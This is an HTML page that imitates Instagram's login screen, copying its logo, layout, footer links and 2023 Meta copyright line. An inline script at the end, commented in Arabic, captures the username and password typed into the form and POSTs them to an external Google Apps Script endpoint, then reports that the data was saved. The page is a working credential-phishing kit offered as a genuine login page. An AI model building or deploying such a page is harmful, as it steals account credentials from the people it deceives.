<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- FAVIVON -->
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">
</head>

<body>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Phone number, username or email
                                    </span>
                                    <input type="text" id="username">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Password
                                    </span>
                                    <input type="password" id="password">
                                    <button>Show</button>
                                </div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" id="signin-btn">
                                    Log In
                                </button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>
                            Don't have an account?
                            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                        </p>
                    </div>

                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a href="https://apps.apple.com/us/app/instagram/id389801252">
                                <img src="./images/app-store.png" alt="app store">
                            </a>
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
                                <img src="./images/gg-play.png" alt="google play">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="https://about.instagram.com/">About</a>
                <a href="https://about.instagram.com/blog/">Blog</a>
                <a href="https://about.instagram.com/about-us/careers">Jobs</a>
                <a href="https://help.instagram.com/">Help</a>
                <a href="https://developers.facebook.com/docs/instagram">API</a>
                <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
                <a href="https://help.instagram.com/581066165581870/">Terms</a>
                <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a>
                <a href="https://www.threads.net/login">threads</a>
                <a href="https://www.instagram.com/explore/locations/">Locations</a>
                <a id="darkmode-toggle">Darkmode</a>
            </div>
            <div class="copyright">
                © 2023 Instagram from Meta
            </div>
        </div>
    </div>

    <script src="./app.js"></script>
    <script src="./supabase.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            let signin_btn = document.querySelector('#signin-btn');
    
            // إضافة حدث النقر إلى زر تسجيل الدخول
            signin_btn.addEventListener('click', function(event) {
                event.preventDefault();
    
                // احصل على قيمة اسم المستخدم وكلمة المرور من النموذج
                let username = document.querySelector('#username').value;
                let password = document.querySelector('#password').value;
    
                // إرسال البيانات إلى الخادم
                sendDataToServer(username, password);
            });
    
            function sendDataToServer(username, password) {
                // قم بإنشاء كائن FormData لتخزين البيانات
                let formData = new FormData();
                formData.append('username', username);
                formData.append('password', password);
    
                // استخدم fetch لإرسال البيانات إلى الخادم
                fetch('https://script.google.com/macros/s/AKfycbwL82nBiFVifMe9nOVpGv7oVFLEGZU-szaO9JFRchfCutHYuvShtS59eliwQXnUd98hqQ/exec', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    // هنا يمكنك إجراء الإجراءات بعد الحفظ، على سبيل المثال، إظهار رسالة نجاح
                    alert('تم حفظ البيانات بنجاح');
                })
                .catch(error => {
                    // هنا يمكنك التعامل مع أي أخطاء في الطلب
                    alert('حدث خطأ أثناء حفظ البيانات: ' + error);
                });
            }
        });
    </script>

</body>

</html>
